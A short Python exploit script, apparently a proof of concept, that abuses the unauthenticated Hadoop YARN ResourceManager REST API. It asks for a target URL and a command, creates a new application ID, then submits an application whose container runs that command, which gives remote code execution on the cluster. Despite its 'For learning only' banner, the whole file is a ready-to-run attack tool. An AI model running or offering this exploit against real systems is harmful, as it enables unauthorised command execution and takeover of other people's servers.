#!/usr/bin/env python3
import requests
print("==================================")
print("=           OneBitSec            =")
print("=                                =")
print("=    https://github.com/N0b1ta   =")
print("=                                =")
print("=        For learning only       =")
print("==================================")

target = input("please input target URL,example:http://127.0.0.1:8088/ :\n")
appnames = input("please input application name: \n")
cmds = input("please input command : \n")
 
url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': appnames,
    'am-container-spec': {
        'commands': {
            'command': cmds,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)